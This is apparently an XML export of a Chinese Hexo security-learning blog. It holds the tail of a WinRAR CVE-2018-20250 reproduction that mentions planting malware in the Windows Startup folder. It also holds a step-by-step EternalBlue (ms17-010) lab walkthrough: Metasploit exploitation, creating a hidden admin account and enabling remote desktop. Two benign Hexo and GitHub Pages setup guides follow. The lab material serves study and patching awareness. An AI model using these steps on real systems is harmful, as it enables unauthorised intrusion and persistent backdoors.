Linux中会收到会话，即可获得靶机权限 四.后记以上便是使用CVE-2018-20250漏洞对靶机进行攻击的整个复现过程，我们看到病毒可以通过恶意压缩包进行传播，在本次复现中，我们将病毒文件直接解压在压缩文件解压的目标文件夹中并手动运行的，其实我们是可以通过修改exp.py文件中target_filename的值来修改病毒文件解压出来的位置，例如对win7系统的靶机，我们可以将值修改为r&quot;C:\ProgramData\Microsoft\Windows\Start Menu\Programs\Startup\hi.exe&quot;，这样病毒文件就会在下次开机是自动启动，悄无声息的完成对电脑的攻击。 大家可以留意一下自己电脑中压缩软件的版本，选择最新版本的软件即可防止此类攻击，同时也要养成好的习惯，不随意下载和使用不明来源的压缩文件]]></content>
      <categories>
        <category>漏洞复现</category>
      </categories>
      <tags>
        <tag>Metasploit</tag>
        <tag>漏洞复现</tag>
        <tag>CVE-2018-20250</tag>
        <tag>WinRAR目录穿越漏洞</tag>
      </tags>
  </entry>
  <entry>
    <title><![CDATA[ms17-010（永恒之蓝）漏洞复现]]></title>
    <url>%2Fms17-010%E5%A4%8D%E7%8E%B0%2F</url>
    <content type="text"><![CDATA[前言 复现准备 复现过程 后记 一.前言2017年5月12日起，全球范围内爆发基于Windows网络共享协议进行攻击传播的蠕虫恶意代码，这是不法分子通过改造之前泄露的NSA黑客武器库中“永恒之蓝”攻击程序发起的网络攻击事件。五个小时内，包括英国、俄罗斯、整个欧洲以及中国国内多个高校校内网、大型企业内网和政府机构专网中招，被勒索支付高额赎金才能解密恢复文件，对重要数据造成严重损失。本文在虚拟环境中，使用Nmap和Metasploit对病毒攻击进行复现，展示其攻击过程，供大家学习和参考。 二.复现准备1.漏洞描述Eternalblue通过TCP端口445和139来利用SMBv1和NBT中的远程代码执行漏洞，恶意代码会扫描开放445文件共享端口的Windows机器，无需用户任何操作，只要开机上网，不法分子就能在电脑和服务器中植入勒索软件、远程控制木马、虚拟货币挖矿机等恶意程序。 2.漏洞影响目前已知受影响的 Windows 版本包括但不限于：Windows NT，Windows 2000、Windows XP、Windows 2003、Windows Vista、Windows 7、Windows 8，Windows 2008、Windows 2008 R2、Windows Server 2012 SP0。 3.复现环境虚拟环境搭建：VMware Workstation 15 pro 网络模式：NAT 攻击机：kali Linux 2019.1 IP:192.168.28.136 靶机：Windows 7 ultimate sp1 x64 IP:192.168.28.128 三.复现过程1.使用Nmap对靶机进行扫描1.1.在本地查找ms17-010漏洞 1.2.使用nmap对靶机进行扫描使用命令并执行 1root@kali:/usr/share/nmap/scripts# nmap --script smb-vuln-ms17-010 192.168.28.128 2.使用Metasploit对目标进行监听输入msfconsole启动Metasploit在Metasploit中，输入search ms17-010查找永恒之蓝漏洞 输入use exploit/windows/smb/ms17_010_eternalblue执行漏洞输入show options查看当前攻击配置 将配置中第一行的RHOST修改为靶机IP地址1set rhost 192.168.28.128 再次查看配置 配置完成后，使用run命令执行程序，如果执行成功，会进入windows系统的命令行 在命令行中输入whoami查看当前登录用户 3.在靶机创建用户并赋予管理员权限12net user username password /addnet localgroup administrators username /add 4.开启3389端口并使用远程桌面登录在命令行中输入REG ADD HKLM\SYSTEM\CurrentControlSet\Control\Terminal&quot; &quot;Server /v fDenyTSConnections /t REG_DWORD /d 0 /f并执行，即可打开3389端口此时我们新建一个终端，输入rdesktop 192.168.28.128登录远程桌面 此时我们选择其他用户并使用刚才创建的用户登录，稍等便能登录到Windows桌面了 四.后记以上便是使用ms17-010永恒之蓝漏洞对靶机进行攻击的整个复现过程，由此可见攻击过程并不复杂，只需要简单的步骤即可完成攻击并获得极高的权限。由此我们也可以看到平常在使用计算机的时候要注重安全防护。 此漏洞应该在系统的自动更新或各电脑管家的更新中会提示修复的，大家可以查看一下自己的系统有没有安装，没有的话一定要安装]]></content>
      <categories>
        <category>漏洞复现</category>
      </categories>
      <tags>
        <tag>Nmap</tag>
        <tag>Metasploit</tag>
        <tag>ms17-010</tag>
        <tag>永恒之蓝</tag>
        <tag>漏洞复现</tag>
      </tags>
  </entry>
  <entry>
    <title><![CDATA[在hexo中添加主题和live2d看板娘]]></title>
    <url>%2Fnext_live2d%2F</url>
    <content type="text"><![CDATA[使用hexo主题 在博客中添加live2d看板娘 一.使用hexo主题hexo拥有大量的主题文件，我们可以通过官方的主题页面来查找自己想要的主题，同时官方还有创建主题的文档可以参考。 选择你想要使用的主题，本文用next主题来演示。 1.下载主题进入hexo站点目录下，使用git输入1$ git clone https://github.com/iissnan/hexo-theme-next themes/next 2.启用主题在下完完成后，打开站点配置文件_config.yml，找到theme字段，并将值改为你所使用的主题名。 随后使用hexo clean清除hexo缓存。 3.验证主题启动hexo本地站点 1hexo s -d 访问本地站点，看到主题改变了，就表示安装成功了。 4.自定义主题主题安装完成后，进入theme文件夹下的主题文件夹内，修改_config.yml配置文件，配置文件的具体内容可以参考主题的相关文档。 二.添加live2d看板娘1.安装打开hexo目录，使用git bash输入 1npm install --save hexo-helper-live2d 2.开启进入网站配置文件内，添加如下内容 12345678910111213141516live2d: enable: true scriptFrom: local pluginRootPath: live2dw/ pluginJsPath: lib/ pluginModelPath: assets/ tagMode: false log: false model: use: live2d-widget-model-z16 display: position: right width: 150 height: 300 mobile: show: false 保存后重新生成网站即可看到。 3.添加模型打开hexo目录，使用git bash输入 1npm install 模型的包名 然后将包名输入位于 _config.yml 的 model.use 中。 三.参考资料next主题 live2d]]></content>
      <categories>
        <category>博客搭建</category>
      </categories>
      <tags>
        <tag>博客搭建</tag>
        <tag>Hexo</tag>
        <tag>美化</tag>
        <tag>live2d</tag>
        <tag>Next</tag>
      </tags>
  </entry>
  <entry>
    <title><![CDATA[使用GitHub+hexo搭建个人博客]]></title>
    <url>%2Fmy-first-blog%2F</url>
    <content type="text"><![CDATA[随笔 博客搭建过程 其他的一些东西 一.随笔从3月开始学习网络安全相关的知识，但愿有朝一日能够步入网络安全的门，进入这个行业 学习第二周，第一次搭建博客，第一次写markdown，希望能够坚持下去，记录一些学到的东西 二.使用GitHub搭建个人博客1.准备工作 需要的软件 node.js(http://nodejs.cn/) git(https://git-scm.com/) hexo(https://hexo.io/zh-cn/) 2.创建仓库新建一个名为你的用户名.github.io的仓库，生成后的访问地址是 https://你的用户名.github.io ,貌似必须是自己的用户名，否则无法访问，不过我自己并没有试过。 如果自己有域名的话可以绑定自己的域名，不过不绑定也没有什么关系。 3.配置SSH key使用ssh key来进行本地和服务器间的链接 1$ cd ~/. ssh #检查是否存在ssh密钥 如果提示：No such file or directory 说明你是第一次使用git。 1$ ssh-keygen -t rsa -C "邮箱地址" 然后连续3次回车，最终会生成一个文件在用户目录下，打开用户目录，找到.ssh\id_rsa.pub文件，记事本打开并复制里面的内容，打开你的github主页，进入个人设置 -&gt; SSH and GPG keys -&gt; New SSH key： 保存之后测试一下是否成功 1$ ssh -T git@github.com #这里的邮箱地址不用修改 如果看到提示Are you sure you want to continue connecting (yes/no)? ，输入yes，然后就会看到 Hi CJJKKK! You’ve successfully authenticated, but GitHub does not provide shell access. 说明配置已经成功了，接下来继续配置用户名和邮箱 12$ git config --global user.name "用户名" #你的用户名$ git config --global user.email "邮箱" #你的注册邮箱 4.安装hexo4.1关于hexoHexo是一个简单、快速、强大的基于 Github Pages 的博客发布工具，支持Markdown格式，有众多优秀插件和主题。 4.2安装 (1)尽量使用git bash来完成 (2)hexo不同版本有较大差别，看教程的时候要注意 (3)hexo有两种配置文件_config.yml文件，一个是根目录下的，一个是各个theme下的 安装hexo 1$ npm install -g hexo 5.初始化在电脑上新建一个文件夹专门用来存放代码，然后使用git bash进入该文件夹 1$ hexo init hexo会自动下载一些文件到这个目录 12$ hexo g #生成$ hexo s #启动 执行这些命令后，hexo就会在public文件夹生成相关html文件，这些文件将来都是要提交到github去的 hexo s是开启本地预览服务，打开浏览器访问 http://localhost:4000 即可看到内容，如果打不开可能是端口被占用了，可以换个端口解决。记得本地预览完之后用ctrl+c关闭本地预览服务 hexo是支持修改主题的，具体如何修改可能下一篇文章会讲hhh 6.上传到GitHub完成了上面的操作后，就要上传到GitHub了 在配置完ssh key之后，要配置_config.yml中的有关deploy部分 1234deploy: type: git repository: git@github.com:用户名/用户名.github.io.git branch: master 接下来输入hexo d -g就会提交代码了 如果显示error deployer not found:github，可以使用如下命令来完成 1$ npm install --save hexo-deployer-git 还有一些关于保留CNAME、README.md等文件的东西，一些非md文件可以把他们放到source文件夹下，这里的所有文件都会原样复制（除了md文件）到public目录的。由于hexo默认会把所有md文件都转换成html，包括README.md，所有需要每次生成之后、上传之前，手动将README.md复制到public目录，并删除README.html。 7.常用hexo命令1234567$ hexo new "postName" #新建文章$ hexo new page "pageName" #新建页面$ hexo generate #生成静态页面至public目录$ hexo server #开启预览访问端口（默认端口4000，'ctrl + c'关闭server）$ hexo deploy #部署到GitHub$ hexo help # 查看帮助$ hexo version #查看Hexo的版本 组合命令 12$ hexo s -g #生成并本地预览$ hexo d -g #生成并上传 8.如何写博客定位到代码目录里，执行命令 1$ hexo new 'my-first-blog' hexo会在_post下生成相关的md文件，这时候只要打开就可以写博客了 一般完整格式如下： 123456789---title: postName #文章页面上的显示名称，一般是中文date: 2013-12-02 15:30:16 #文章生成时间，一般不改，当然也可以任意修改categories: 默认分类 #分类tags: [tag1,tag2,tag3] #文章标签，可空，多标签请用格式，注意:后面有个空格description: 附加一段文章摘要，字数最好在140字以内，会出现在meta的description里面---以下是正文 关于写博客的工具，我用的是Typora，或者有其他的写markdown的工具也可以，反正我是刚开始用，用的也不好。 让博客不显示全文的方法 在合适的位置上加入&lt;!--more--&gt;即可。 三.还有些其他的到此位置使用GitHub搭建博客应该就完成了，这个时候可以去查看一下自己的博客是什么样子的了。 我本人实在是不大会写markdown，就先写这么多，可能最后有一些问题，比如目录显示不出来之类的，学会了继续改。 最后是一些参考资料。 参考博客 markdown教程 Hexo文档]]></content>
      <categories>
        <category>博客搭建</category>
      </categories>
      <tags>
        <tag>博客搭建</tag>
        <tag>Hexo</tag>
        <tag>随笔</tag>
        <tag>GitHub</tag>
      </tags>
  </entry>
</search>
